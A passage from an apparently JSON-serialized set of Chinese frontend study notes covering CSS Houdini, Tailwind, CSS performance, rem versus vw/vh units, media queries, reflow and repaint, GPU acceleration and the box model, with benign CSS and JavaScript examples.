  async intrinsicSizes() { /* ... */ }\n    \n    async layout(children, edges, constraints, styleMap) {\n        // 实现瀑布流布局逻辑\n        const columns = parseInt(styleMap.get('--columns'));\n        // ... 布局计算\n    }\n});\n```\n\n```css\n.container {\n    display: layout(masonry);\n    --columns: 3;\n}\n```\n\n## 5. CSS Typed OM\n\n```javascript\n// 传统方式\nelement.style.opacity = '0.5';\n\n// Typed OM\nelement.attributeStyleMap.set('opacity', 0.5);\n\n// 获取计算样式\nconst opacity = element.computedStyleMap().get('opacity');\nconsole.log(opacity.value); // 0.5\n```\n\n## 6. 实际应用示例\n\n### 6.1. 渐变边框生成器\n\n```javascript\n// paint-worklet.js\nclass GradientBorderPainter {\n    static get inputProperties() {\n        return [\n            '--border-width',\n            '--gradient-start',\n            '--gradient-end'\n        ];\n    }\n    \n    paint(ctx, size, properties) {\n        const width = properties.get('--border-width');\n        const startColor = properties.get('--gradient-start');\n        const endColor = properties.get('--gradient-end');\n        \n        const gradient = ctx.createLinearGradient(0, 0, size.width, size.height);\n        gradient.addColorStop(0, startColor);\n        gradient.addColorStop(1, endColor);\n        \n        ctx.strokeStyle = gradient;\n        ctx.lineWidth = width;\n        ctx.strokeRect(0, 0, size.width, size.height);\n    }\n}\n\nregisterPaint('gradient-border', GradientBorderPainter);\n```\n\n```css\n.gradient-box {\n    --border-width: 2px;\n    --gradient-start: `#ff0000;`\n    --gradient-end: `#00ff00;`\n    border-image: paint(gradient-border);\n}\n```\n\n### 6.2. 自定义动画属性\n\n```javascript\n// 注册自定义动画属性\nCSS.registerProperty({\n    name: '--slide-distance',\n    syntax: '<length>',\n    inherits: false,\n    initialValue: '0px'\n});\n```\n\n```css\n@keyframes slide {\n    from {\n        --slide-distance: 0px;\n    }\n    to {\n        --slide-distance: 100px;\n    }\n}\n\n.sliding-element {\n    animation: slide 2s infinite;\n    transform: translateX(var(--slide-distance));\n}\n```\n\n## 7. 浏览器支持检测\n\n```javascript\n// 检测各个 API 的支持情况\nconst support = {\n    paint: CSS.paintWorklet !== undefined,\n    layout: CSS.layoutWorklet !== undefined,\n    properties: CSS.registerProperty !== undefined,\n    typedOM: window.CSS?.number !== undefined\n};\n\n// 根据支持情况提供降级方案\nif (support.paint) {\n    CSS.paintWorklet.addModule('my-paint-worklet.js');\n} else {\n    // 降级处理\n    element.style.background = 'fallback-color';\n}\n```\n\n## 8. 性能考虑\n\n```javascript\n// 优化 Paint Worklet 性能\nclass OptimizedPainter {\n    // 缓存常用值\n    static get inputProperties() {\n        return ['--cache-key'];\n    }\n    \n    // 使用 requestAnimationFrame 优化动画\n    paint(ctx, size, properties) {\n        requestAnimationFrame(() => {\n            // 执行绘制操作\n        });\n    }\n}\n```\n\n## 9. 错误处理\n\n```javascript\n// 注册属性时的错误处理\ntry {\n    CSS.registerProperty({\n        name: '--my-prop',\n        syntax: '<color>',\n        inherits: false,\n        initialValue: '#000000'\n    });\n} catch (error) {\n    console.warn('CSS Custom Properties not supported:', error);\n    // 提供后备方案\n}\n```\n\n## 10. 最佳实践\n\n1. **渐进增强**\n```javascript\n// 检测特性支持\nif ('paintWorklet' in CSS) {\n    // 使用 Houdini\n} else {\n    // 使用传统方案\n}\n```\n\n2. **模块化设计**\n```javascript\n// 将 Worklet 代码分离到独立文件\nconst worklets = {\n    paint: 'paint-worklet.js',\n    layout: 'layout-worklet.js'\n};\n\n// 按需加载\nasync function loadWorklet(type) {\n    if (CSS[`${type}Worklet`]) {\n        await CSS[`${type}Worklet`].addModule(worklets[type]);\n    }\n}\n```\n\n3. **性能监控**\n```javascript\n// 监控 Worklet 性能\nconst paintStart = performance.now();\n// Paint Worklet 操作\nconst paintEnd = performance.now();\n\nconsole.log(`Paint took ${paintEnd - paintStart}ms`);\n```\n\nCSS Houdini 提供了强大的底层能力，但需要注意浏览器**兼容性和性能影响**。\n","gwGe3XcG":"\n# Tailland CSS\n\n\n`#前端/CSS` \n\n\n## 目录\n<!-- toc -->\n ## 1. 主要特点 \n\n- 原子级类：每个类通常只做一件事。\n- 组合使用：通过组合多个类来实现复杂的样式。\n- 直接在 HTML 中应用：样式直接在 HTML 元素上应用，而不是在单独的 CSS 文件中。\n- 预定义类：使用框架提供的预定义类，而不是自定义 CSS。\n\n## 2. 优势解释\n\n- 快速开发：\n\t- **不需要切换到 CSS 文件**，直接在 HTML 中应用样式。\n- 一致性：\n\t- 使用预定义的类确保整个项目的样式一致。\n- 响应式设计：\n\t- 可以轻松添加响应式前缀（如 `md:`, `lg:`）来适应不同屏幕尺寸。\n- 避免命名困难：\n\t- 不需要为每个元素想独特的类名。\n\n## 3. 问题\n\n- HTML 膨胀、可维护性\n- **语义化问题**\n- 可能不适合小项目\n- 设计一致性的挑战\n\n## 4. 最后\n\n- 深度使用才知道好处\n- ==结合 LLM 有好处，LLM上下文的 token 有限制==","eND72oWN":"\n# CSS 性能优化思路\n\n\n`#前端/CSS`\n\n>  可以从网络 → 解析 → 运行时的维度来展开，更==具有逻辑性==\n\n\n## 目录\n<!-- toc -->\n ## 1. 减少 CSS 文件的大小 \n\n- 压缩 CSS 文件：\n\t- 使用工具（如 CSSNano、csso）压缩 CSS 文件，去除空格、注释和不必要的字符。\n- 移除未使用的 CSS：\n\t- 使用工具（如 PurifyCSS、PurgeCSS）检测并移除未使用的 CSS 规则。\n\t- 开发者工具查看使用了多少的样式，那些是无用的\n\n## 2. 优化选择器\n\n- 避免过于具体的选择器：\n\t- 复杂的选择器（如后代选择器）会增加浏览器的匹配时间。尽量使用简单的选择器。\n- 避免使用通配符选择器：\n\t- 如 `*` 选择器会匹配所有元素，性能较差。\n- 减少嵌套层级：\n\t- 过深的嵌套会增加选择器的复杂度，影响性能。\n\n## 3. 使用高效的布局技术\n\n- 优先使用 Flexbox 和 Grid 布局：\n\t- 这些布局模型在现代浏览器中性能较好，且代码简洁易维护。\n- 避免使用浮动布局：\n\t- 浮动布局需要更多的清理和处理，影响性能。\n\n## 4. 减少重排和重绘\n\n- 避免频繁修改样式：\n\t- 频繁修改样式会导致重排和重绘，影响性能。尽量批量修改样式。\n- 使用 `class` 切换而不是直接修改样式：\n\t- 通过切换 `class` 来改变样式，而不是直接修改元素的 `style` 属性。\n- 避免使用 JavaScript 修改样式：\n\t- 尽量使用 CSS 过渡和动画，而不是通过 JavaScript 修改样式。\n\n## 5. 使用硬件加速\n\n启用 GPU 加速：使用 `transform`、`opacity` 和 `will-change` 属性来启用 GPU 加速，减少 CPU 负载。\n\n```css\n.element {\n  will-change: transform, opacity;\n}\n```\n\n## 6. 延迟加载和异步加载\n\n- 异步加载 CSS：使用 `media` 属性和 `onload` 事件异步**加载非关键 CSS。**\n\n```html\n<link rel=\"stylesheet\" href=\"non-critical.css\" media=\"print\" onload=\"this.media='all'\">\n<noscript><link rel=\"stylesheet\" href=\"non-critical.css\"></noscript>\n\n```\n\n> 比如==打印==的样式肯定需要后置 ` media=\"print\"`\n\n## 7. 使用 CSS 预处理器和后处理器\n\n- 使用预处理器（如 Sass、Less）：\n\t- 预处理器可以帮助组织和优化 CSS 代码，提高可维护性。\n- 使用后处理器（如 PostCSS）：\n\t- 后处理器可以自动添加浏览器前缀、压缩 CSS 等。\n\n## 8. 优化字体加载\n\n- 使用字体显示策略：使用 `font-display` 属性优化字体加载体验。\n```css\n@font-face {\n  font-family: 'MyFont';\n  src: url('myfont.woff2') format('woff2');\n  font-display: swap;\n}\n```\n\n- 只加载必要的字体：避免加载过多的字体变体和字符集。\n\n## 9. 代码分割和按需加载\n\n- 按需加载 CSS：\n\t- 将不同页面的样式分割成不同的 CSS 文件，按需加载。\n\n## 10. 使用现代 CSS 特性\n\n- 使用 CSS 变量：CSS 变量可以减少重复代码，提高可维护性和性能。\n```css\n:root {\n  --primary-color: `#3498db;`\n}\n\n.element {\n  color: var(--primary-color);\n}\n```\n\n- 使用现代布局和功能：\n\t- 如 CSS Grid、Flexbox、`clamp()`、`min()`、`max()` 等，**减少依赖 JavaScript 实现复杂布局和功能**。\n\n## 11. 提前加载关键 CSS\n\n内联关键 CSS：将关键 CSS 内联到 HTML 中，减少初始渲染时间。\n\n```html\n<style>\n  /* 关键 CSS */\n  body {\n    font-family: 'Arial', sans-serif;\n  }\n</style>\n\n```\n\n## 12. 使用内容分发网络 (CDN)\n\n- 使用 CDN 提供 CSS：\n\t- 使用 CDN 提供的 CSS 文件，可以加速文件加载。\n","JRfZKCCO":"\n# rem 和 vw、vh\n\n`#javascript` `#css` \n\n\n## 目录\n<!-- toc -->\n ## 1. rem 方案 \n\n### 1.1. 优点：\n\n1. **浏览器兼容性好**\n\t- 支持 IE9 及以上\n\t- 几乎所有现代浏览器都完全支持\n\n2. **可控性强**\n\t- 可以通过改变 html 的 `font-size` 来统一控制所有使用 rem 的元素\n\t- 便于整体缩放\n\n3. **适合移动端**\n\t- 常用的 `flexible` 方案就是基于 `rem` 实现\n\t- 对于不同尺寸的移动设备适配效果好\n\n### 1.2. 缺点：\n\n1. **需要额外的 JavaScript 代码**\n   ```javascript\n   // 常见的 rem 适配代码\n   (function() {\n     function resize() {\n       const width = document.documentElement.clientWidth\n       document.documentElement.style.fontSize = width / 10 + 'px'\n     }\n     window.addEventListener('resize', resize)\n     resize()\n   })()\n   ```\n\n2. **计算复杂**\n   - 需要将设计稿的 `px` 值转换为 rem\n   - 虽然可以通过 `PostCSS` 插件自动转换\n\n3. **存在舍入误差**\n   - 因为浏览器对小数的 `font-size` 处理有差异\n   - `可能导致细微的布局偏差`\n\n## 2. vw/vh 方案：纯 CSS 解决方案\n\n### 2.1. 优点：\n\n1. **更加直观**\n\t- 1vw 等于视口宽度的 1%\n\t- 1vh 等于视口高度的 1%\n\t- 计算更简单直接\n\n2. **不需要 JavaScript**\n\t- `纯 CSS 解决方案`\n\t- 性能更好\n\n3. **响应更加及时**\n\t- 直接跟随视口大小变化\n\t- 不需要等待 `JavaScript` 执行\n\n### 2.2. 缺点：\n\n1. **兼容性稍差**\n\t- IE11 才开始支持\n\t- 部分老旧移动设备可能存在兼容问题\n\n2. **无法整体控制**\n\t- 不像 rem 可以通过改变一个值来统一控制\n\t- ==需要修改每个使用 vw/vh 的地方==\n\n3. **特定场景下的问题**\n\t- 在移动端，`100vh` **可能会出现滚动问题**\n\t- ==软键盘弹出时可能导致布局问题==\n\n## 3. 实际应用建议\n\n### 3.1. 移动端\n\n```css\n/* rem 方案 */\n.box {\n  width: 7.5rem;    /* 假设 html font-size = width/10 */\n  height: 3.75rem;\n}\n\n/* vw 方案 */\n.box {\n  width: 75vw;      /* 直接使用百分比 */\n  height: 37.5vw;\n}\n```\n\n### 3.2. 混合使用\n\n```css\n/* 结合两者优点 */\n.container {\n  /* 大布局使用 vw */\n  width: 100vw;\n  padding: 3vw;\n  \n  /* 文字使用 rem */\n  font-size: 1rem;\n}\n\n/* 最小值保护 */\n.text {\n  font-size: max(16px, 1rem);\n}\n```\n\n### 3.3. 响应式断点\n\n```css\n/* rem 方案 */\n@media screen and (min-width: 768px) {\n  html {\n    font-size: 16px;\n  }\n}\n\n/* vw 方案 */\n@media screen and (min-width: 768px) {\n  .container {\n    width: 80vw;\n    margin: 0 auto;\n  }\n}\n```\n\n## 4. 选择建议\n\n1. **移动端项目**\n   - 如果需要精确还原设计稿，推荐使用 rem\n   - 如果追求开发效率，推荐使用 vw\n\n2. **PC 端项目**\n   - 推荐使用 vw/vh 配合媒体查询\n   - 特别是现代网站开发\n\n3. **混合开发**\n   - 可以 rem 和 vw/vh 结合使用\n   - rem 用于字体大小\n   - vw/vh 用于布局尺寸\n\n4. **需要考虑兼容性**\n   - 如果需要支持 IE，使用 rem\n   - 现代浏览器推荐 vw/vh\n\n## 5. 最佳实践：组合使用\n\n```css\n/* 基础设置 */\n:root {\n  /* 基准字体大小 */\n  font-size: 16px;\n  \n  /* 在移动端使用 vw */\n  @media screen and (max-width: 768px) {\n    font-size: 3.75vw; /* 基于 375px 设计稿 */\n  }\n}\n\n/* 混合使用 */\n.container {\n  /* 布局使用 vw */\n  width: 90vw;\n  margin: 0 auto;\n  \n  /* 文字使用 rem */\n  font-size: 1rem;\n  \n  /* 间距可以使用 vw 或 rem */\n  padding: 1rem;\n  /* 或 */\n  padding: 3vw;\n}\n```\n\n这样的组合使用能够在保持灵活性的同时，也确保了良好的可维护性和兼容性。","VaDHL25B":"\n# 媒体查询\n\n`#前端/CSS`  \n\n常见的媒体查询语句如下\n\n- min-width\n- max-width\n- `orientation`\n- `@container`\n\n\n## 目录\n<!-- toc -->\n ## 1. `Container` Queries  \n\n- **描述**：允许**根据容器的尺寸**而==不是视口尺寸==来应用样式。\n- **特点**：**更灵活的响应式设计，更灵活的媒体查询**\n- **示例**：\n\n```css\n@container (min-width: 500px) {\n  .element {\n    background-color: blue;\n  }\n}\n```\n\n## 2. **屏幕宽度查询（最常用）**\n\n```css\n/* 最小宽度 */\n@media (min-width: 768px) {\n    .container {\n        width: 750px;\n    }\n}\n\n/* 最大宽度 */\n@media (max-width: 767px) {\n    .container {\n        width: 100%;\n    }\n}\n\n/* 宽度范围 */\n@media (min-width: 768px) and (max-width: 1024px) {\n    .container {\n        width: 960px;\n    }\n}\n```\n\n## 3. **设备类型查询**\n\n```css hl:8\n/* 屏幕设备 */\n@media screen {\n    .print-only {\n        display: none;\n    }\n}\n\n/* 打印设备 */\n@media print {\n    .screen-only {\n        display: none;\n    }\n}\n\n/* 所有设备 */\n@media all {\n    /* 样式 */\n}\n```\n\n## 4. **屏幕方向查询**\n\n```css\n/* 横向 */\n@media (orientation: landscape) {\n    .sidebar {\n        width: 30%;\n    }\n}\n\n/* 纵向 */\n@media (orientation: portrait) {\n    .sidebar {\n        width: 100%;\n    }\n}\n```\n\n## 5. **屏幕分辨率查询**\n\n```css\n/* 高分辨率屏幕 */\n@media (-webkit-min-device-pixel-ratio: 2),\n       (min-resolution: 192dpi) {\n    .logo {\n        background-image: url('high-res-logo.png');\n    }\n}\n```\n\n## 6. **常见断点范例**\n\n```css\n/* 移动优先的响应式设计 */\n\n/* 小型手机 (320px 及以上) */\n@media (min-width: 320px) {\n    /* 样式 */\n}\n\n/* 大型手机 (480px 及以上) */\n@media (min-width: 480px) {\n    /* 样式 */\n}\n\n/* 平板 (768px 及以上) */\n@media (min-width: 768px) {\n    /* 样式 */\n}\n\n/* 小型桌面显示器 (992px 及以上) */\n@media (min-width: 992px) {\n    /* 样式 */\n}\n\n/* 大型桌面显示器 (1200px 及以上) */\n@media (min-width: 1200px) {\n    /* 样式 */\n}\n```\n\n## 7. **特性查询**\n\n```css hl:1,8,16\n/* 悬停功能查询 */\n@media (hover: hover) {\n    .button:hover {\n        background-color: `#ddd;`\n    }\n}\n\n/* 暗色主题查询 */\n@media (prefers-color-scheme: dark) {\n    body {\n        background-color: `#333;`\n        color: `#fff;`\n    }\n}\n\n/* 减少动画查询 */\n@media (prefers-reduced-motion: reduce) {\n    * {\n        animation: none !important;\n        transition: none !important;\n    }\n}\n```\n\n## 8. **视口高度查询**\n\n```css\n/* 最小高度 */\n@media (min-height: 600px) {\n    .modal {\n        max-height: 500px;\n    }\n}\n\n/* 最大高度 */\n@media (max-height: 599px) {\n    .modal {\n        max-height: 300px;\n    }\n}\n```\n\n## 9. **组合查询**\n\n```css\n/* 组合多个条件 */\n@media screen and (min-width: 768px) and (orientation: landscape) {\n    .content {\n        display: flex;\n    }\n}\n```\n\n## 10. **常用的 Bootstrap 断点**\n\n```css\n/* Extra small devices (phones, less than 576px) */\n/* No media query since this is the default */\n\n/* Small devices (landscape phones, 576px and up) */\n@media (min-width: 576px) {\n    /* 样式 */\n}\n\n/* Medium devices (tablets, 768px and up) */\n@media (min-width: 768px) {\n    /* 样式 */\n}\n\n/* Large devices (desktops, 992px and up) */\n@media (min-width: 992px) {\n    /* 样式 */\n}\n\n/* Extra large devices (large desktops, 1200px and up) */\n@media (min-width: 1200px) {\n    /* 样式 */\n}\n```\n\n## 11. **最佳实践**\n\n```css hl:1\n/* 使用 em/rem 单位进行响应式设计 */\n@media (min-width: 48em) { /* 768px/16px = 48em */\n    .container {\n        font-size: 1.2rem;\n    }\n}\n\n/* 移动优先设计模式 */\n.element {\n    /* 基础样式（移动设备） */\n    width: 100%;\n}\n\n@media (min-width: 768px) {\n    .element {\n        /* 平板样式 */\n        width: 50%;\n    }\n}\n\n@media (min-width: 1024px) {\n    .element {\n        /* 桌面样式 */\n        width: 33.33%;\n    }\n}\n```\n\n","wvgr9Dc5":"\n# CSS 兼容性相关\n\n\n`#前端/CSS`  \n\n- `@supports not (--css: variables) {}` 用于确定是否支持 `css 变量`\n- Autoprefixer\n- Can I use?\n- CSS Reset\n- `CSS Reset`: 如 Eric Meyer’s Reset CSS\n- `Normalize.css`: \n\t- 保留有用的默认样式，同时标准化跨浏览器的样式\n- Modernizr 库: \n\t- 一个流行的库，用于检测 HTML5 和 CSS3 特性，比如 `if (Modernizr.flexbox) {} `\n- IE条件注释\n\t- ==太老了，可以不用关注了==\n- 渐进增强和优雅降级\n- CSS Hack：\n\t- 比如 `*color: yellow; /* IE6,IE7 */`\n- 单位兼容性：\n\t- 使用 `px` , 有可能 `rem/vw/vh` 不支持\n\n","iL9ISsR4":"\n# 回流和重绘\n\n\n`#前端/CSS`   `#R2` \n\n\n## 目录\n<!-- toc -->\n ## 1. 先看定义 \n\n- `回流（或重排）`：布局引擎会根据各种样式计算每个盒子在页面上的`大小与位置`\n\t- 重排（也称为回流）是浏览器重新计算页面中`元素位置和几何形状`的过程\n- `重绘`：\n\t- 当计算好盒模型的`位置、大小及其他属性`后，浏览器根据每个盒子特性进行绘制\n- `重绘`不一定导致`重排`，但`重排`一定会导致`重绘` ，如下图：\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/0e89990a6d49095e5a717c3af1edeb53.png)\n\n## 2. 导致`回流`的场景\n\n- 页面`首次渲染`\n- 浏览器`窗口大小`发生改变\n- 元素`尺寸或位置`发生改变\n- 元素内容变化（`文字数量`或`图片大小`等等）\n- 元素`字体大小`变化\n- `添加或者删除`可见的DOM元素\n- 激活CSS伪类（例如：`:hover`）\n- `calc()` 本身不会引起 `回流`，\n\t- 但是因为需要重新计算布局的属性，比如父元素的宽度改变了，那必然会导致子元素的一个 `回流`\n- `查询某些属性`或`调用某些方法`\n   - `dom.style.width/height` ，只能取`行内样式的宽和高`，`style` 中 `link` 外链取不到。可写，修改时会导致`重排`\n   - `window.getComputedStyle(dom).width/height`，指定`第二参数`指定一个要匹配的伪元素的字符串。必须对普通元素省略（`或null`） ，\n      - 读取的样式是`最终样式`，包括了内联样式、嵌入样式和外部样式\n      - 比如`getComputedStyle(h3, '::after').content` \n      - 会导致`回流` 因为它需要获取祖先节点的一些信息进行计算（譬如宽高等），为求一个`“即时性”`和`“准确性”`。\n   - `dom.getBoundingClientRect().width/height 、top/left/right/bottom` 得到`渲染后的宽和高`，及`相对于视窗的上下左右`的距离\n   - 获取`布局信息`时，会导致`重排`。相关的方法属性如 `offsetTop` `getComputedStyle` 等\n   - `scrollIntoView()`、`scrollIntoViewIfNeeded()` 、 `scrollTo()` 滚动时，会导致`重排`\n\n\n总之， `查询某些属性`或`调用某些方法` 是否会导致重排，关键需要看 `只读了` ，还是有`写入`操作\n\n是否`即时计算`\n- 另外一些容易被忽略的操作：如 getComputedStyle， offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight 这些属性有一个共性，就是需要通过`即时计算`得到。因此浏览器为了获取这些值，也会进行`回流`\n\n## 3. opacity、display 和 visibility\n\n- 修改 `opacity` 和 `visibility` 属性通常只会触发`重绘`，而不会触发`回流`\n- 而修改 `display` 属性则可能会触发`回流和重绘`\n\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/d416ea83c9a78c5f5445f7568c9de8ba.png)\n\n> - `opacity`为 0 ，可以点击\n> - visibility 为 hidden时，不能点击\n\n## 4. 修改 `left` 和 `right` 的影响\n\n### 4.1. 对于绝对定位 (`position: absolute`) 和 固定定位 (`position: fixed`)的元素\n\n> [!abstract]\n>  > **结论： 对于脱离文档流的元素：一般不会引起文档流的重排，但会导致该元素的重绘。**\n\n- 这些元素脱离正常文档流，它们的布局不再影响和被其他元素影响\n- 对于脱离文档流的元素（如`position: absolute`或`position: fixed`）\n\t- 修改`left`和`right`属性通常直接影响该元素本身的位置，而不会影响到其他元素的布局，因此**不会引起整体布局的重排**\n\t- 然而，依然会 **导致该元素的重绘（repaint），但不涉及到重排（reflow）**\n\n### 4.2. 对于对于未脱离文档流的元素（如`position: relative`）\n\n- 可能会导致该元素及其子元素的重排\n- 元素本身改变了，自然有可能导致整个文档的重排\n\n### 4.3. 对于 `position: sticky` 的元素\n\n#### 4.3.1. `position: sticky` 的特性\n\n- 当元素在容器视口内时，它表现为相对定位（`relative`）。\n- 一旦元素滚动到指定偏移位置，它就表现为固定定位（`fixed`），即相对于视口定位。\n\n#### 4.3.2. 相对定位阶段（在容器视口内）\n\n- 元素还未达到指定的偏移位置，此时与普通的`相对定位`元素非常相似。\n- 修改 `left` 和 `right` 会影响元素的位置，因此可能会引发重排（reflow）。\n\n#### 4.3.3. 固定定位阶段（到达偏移位置）\n\n- 元素达到偏移位置，变为相对视口定位。\n- 修改 `left` 和 `right` 的行为更像是**固定定位**，通常不影响其他元素的布局。\n- 这种情况下，可能只会导致重绘（repaint），不会引发重排。\n\n### 4.4. 总结\n\n- 对于已经脱离文档流的元素（如 position: absolute 或 fixed）\n\t- 仅修改 `left` 和 `right` 的值通常不会导致其他元素的回流，但可能会导致该元素本身的重绘。\n- 对于` position: relative` 来说，会导致\n- 对于 `position: sticky` 看属于那个阶段\n\n## 5. 一些优化建议\n\n### 5.1. `transform` 代替 `top/left` \n\n### 5.2. 避免使用`CSS表达式`（如：`calc()`）\n\n### 5.3. 批量修改 DOM\n\n```javascript\nconst fragment = document.createDocumentFragment();\nfor (let i = 0; i < 10; i++) {\n  const li = document.createElement('li');\n  li.textContent = `Item ${i}`;\n  fragment.appendChild(li);\n}\ndocument.getElementById('myList').appendChild(fragment);\n```\n\n   - 使用文档片段(`DocumentFragment`) 或者 **先将元素设为不可见**，进行多次修改后再显示。\n\n### 5.4. 避免频繁操作样式\n\n```javascript hl:8\n// 不推荐\nconst el = document.getElementById('myElement');\nel.style.borderLeft = '1px';\nel.style.borderRight = '2px';\nel.style.padding = '5px';\n\n// 推荐\nel.style.cssText = 'border-left: 1px; border-right: 2px; padding: 5px;';\n// 或者\nel.classList.add('my-class');\n```\n\n- 合并多次样式修改**一次性修改**。\n- 使用类名替代多次样式修改。\n- `classList.add/remove/toggle` 来切换样式，而不是直接修改` style 属性`\n\n### 5.5. 缓存布局信息：批量修改\n\n```javascript hl:1,7\n// 不推荐： 获取了 100 次 element.offsetLeft \nfor (let i = 0; i < 100; i++) {\n  element.style.left = `${element.offsetLeft + 1}px`;\n}\n\n// 推荐\nlet left = element.offsetLeft;\nfor (let i = 0; i < 100; i++) {\n  left++;\n  element.style.left = `${left}px`;\n}\n```\n\n- **避免多次读取会引发重排的属性**\n\n### 5.6. 使用绝对定位使元素脱离文档流\n\n- 对于频繁重排的元素，可以使用绝对定位使其脱离文档流。\n- `position: absolute、fixed ` 脱离文档流，以避免对其他元素布局的影响。\n\n### 5.7. 优化动画\n\n```javascript\nfunction animate() {\n  // 动画逻辑\n  requestAnimationFrame(animate);\n}\nrequestAnimationFrame(animate);\n```\n\n- 使用 `requestAnimationFrame` 来控制动画\n- 使用 CSS3 动画和 `transforms` 替代 JavaScript 动画\n\n### 5.8. 使用 CSS3 硬件加速\n\n```css\n.move {\n  transform: translateX(100px);\n}\n```\n\n使用 transform、opacity、filters 等属性，触发 GPU 加速。\n\n使用`css3硬件加速`，`可以让transform`、`opacity`、`filters` 这些动画不会引起`回流重绘`\n\n### 5.9. 避免使用 `table` 布局\n\n- 表格布局可能导致多次重排\n\n### 5.10. 降低 CSS 选择器的复杂性\n\n复杂的选择器会增加样式计算时间。\n\n### 5.11. 离线操作：使用 `display: none` 进行大量 DOM 操作\n\n```javascript\nconst el = document.getElementById('myElement');\nel.style.display = 'none';\n// 进行大量 DOM 操作\nel.style.display = 'block';\n```\n\n> 当元素设为 `display: none` 时，对其进行的操作不会引发重排和重绘。\n\n### 5.12. 使用虚拟 DOM\n\n- 像 React、Vue 这样的框架使用`虚拟 DOM` 来优化实际 DOM 操作\n\n### 5.13. 使用防抖(Debounce)和节流(Throttle)\n\n对于频繁触发的事件（如滚动、调整窗口大小等），使用这些技术来限制处理函数的执行频率\n\n### 5.14. 分离读写操作\n\n```javascript\n// 不推荐\nconst h1 = element1.clientHeight;\nelement1.style.height = `${h1 * 2}px`;\nconst h2 = element2.clientHeight;\nelement2.style.height = `${h2 * 2}px`;\n\n// 推荐\nconst h1 = element1.clientHeight;\nconst h2 = element2.clientHeight;\nelement1.style.height = `${h1 * 2}px`;\nelement2.style.height = `${h2 * 2}px`;\n```\n\n先进行**所有的读操作**，然后再进行**写操作**，避免读写交叉导致多次重排\n\n> 在实际应用中，应根据具体情况选择合适的优化方法。\n\n","heukRIVH":"\n# 开启 GPU 硬件加速的原理\n\n\n`#前端/CSS`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 原理 \n\n### 1.1. 核心原理\n\n- GPU 硬件加速的`核心原理`在于将特定的渲染任务从 CPU 移交给 GPU 进行处理。\n- GPU 擅长处理**大规模的并行任务**，这对于动画、变换和其他复杂的视觉效果来说尤其有效。\n- 通过 GPU 硬件加速，可以大幅提升这些任务的执行效率和渲染速度。\n\n### 1.2. 从浏览器的渲染过程分析原理\n\nCSS 开启 GPU 硬件加速的原理主要涉及浏览器的渲染过程和`图层（Layer`）的概念。让我们深入了解这个过程：\n\n浏览器渲染页面通常遵循以下步骤：\n\n- 解析 HTML 构建 DOM 树\n- 解析 CSS 构建 CSSOM 树\n- 将 DOM 和 CSSOM 合并成**渲染树**\n- 布局（Layout）：\n\t- 计算元素的位置和大小\n- 绘制（Paint）：\n\t- 将元素绘制到屏幕上\n- 合成（Composite）：\n\t- 将`不同的图层`合并到一起\n\n#### 1.2.1. 图层（Layer） \n\n- **浏览器会将页面分成多个图层**。默认情况下，普通元素都在同一个图层中。\n- 但某些`特定的 CSS 属性`可以让元素提升为单独的图层。\n\n当一个元素被提升为单独的`图层`时，它的渲染会被委托给 GPU 处理。\n\nGPU 擅长处理纹理和图形，能够高效地处理图层的变换、缩放、旋转等操作。这样就能够 `GPU 硬件加速`\n\n#### 1.2.2. 以 `transform: translate3d(0,0,0)` 为例\n\n- 这个看似无用的 3D 变换会强制浏览器为该元素创建一个`新的图层`。\n- 新图层会被送到 GPU 处理。\n- GPU 可以高效地处理这个图层的后续变换，`无需重新布局或重绘`整个页面。\n\n#### 1.2.3. 内部工作机制\n\n- 当元素被提升为独立图层后，它会被存储为纹理在 GPU 中。\n- GPU 可以直接操作这个纹理，进行位置移动、缩放、旋转等操作，无需 CPU 参与\n- 这大大减少了 CPU 的工作负担，提高了动画的流畅度。\n\n## 2. CSS 触发 GPU 加速的属性\n\n以下是一些可以触发 GPU 硬件加速的 CSS 属性，告诉浏览器在最开始就把`该元素放到新图层渲染`。\n\n### 2.1. transform\n\n应用二维或三维变换，如 `transform: translate3d(0, 0, 0);`\n\n> 注意：其实`二维`也行\n\n### 2.2. opacity：改变元素的透明度\n\n>  **opacity 这个也行，平时没太注意**\n\n### 2.3. filter：应用图像处理效果\n\n`filter` 属性用于应用各种图形处理效果（例如模糊、亮度、对比度等），这些效果通常也会使用 GPU 加速来提高性能。\n\n```css\n.element {\n  filter: blur(5px);\n}\n```\n\n### 2.4. will-change\n\n显式声明某些属性将发生变化，从而让浏览器提前优化这些元素\n\n### 2.5. CSS 动画和过渡（`transition` 或 `animation`）\n\n`will-change` 属性让开发者可以显式地告诉浏览器哪些属性将会变化，从而让浏览器提前优化这些元素。\n\n```css\n.element {\n  will-change: transform, opacity;\n}\n```\n\n## 3. 优势\n\n- 减少重绘：\n\t- 图层的变化不会影响其他图层，减少了不必要的`重绘`\n- 提高性能：\n\t- GPU 并行处理能力强，适合处理图形任务\n- 流畅动画：\n\t- 减少了 CPU 的参与，使动画更加流畅\n\n## 4. 注意事项\n\n- 过度使用可能导致内存占用增加。\n- 不是所有设备都有强大的 GPU，过度依赖可能在低端设备上适得其反。\n- 不同浏览器的实现可能有差异。\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/61f5c262db0860b921ca61e0479d99d2.png)\n\n","F8beBjme":"\n# 盒模型\n\n\n`#前端/CSS` \n\n\n## 目录\n<!-- toc -->\n ## 1. 标准盒模型 和 IE 盒模型 \n\n>  CSS `box-sizing` 的默认值是 `content-box`\n\n- 标准盒模型：`width = content`\n- IE 盒模型：`width = border + padding + content`\n\n如下图所示：\n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/3193f0e277d0e85d83a2451b624006f3.png)\n\n## 2. box-sizing 可以设置装两种模型\n\n如下图：\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/3514efe3929b598730be168652a3e627.png)\n\n","Z9eKY6fd":"\n# BFC 与外边距重叠\n\n\n`#前端/CSS`   \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n`BFC（Block Formatting Context，块级格式化上下文）`是 CSS 中一个重要的概念，它是页面布局中的一个独立渲染区域，决定了元素如何定位及与其他元素之间的关系。\n\n![image.png|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/54562a17d3dbd31f0f89a9e125bfe2c3.png)\n\n## 2. BFC 的特性\n\n1. 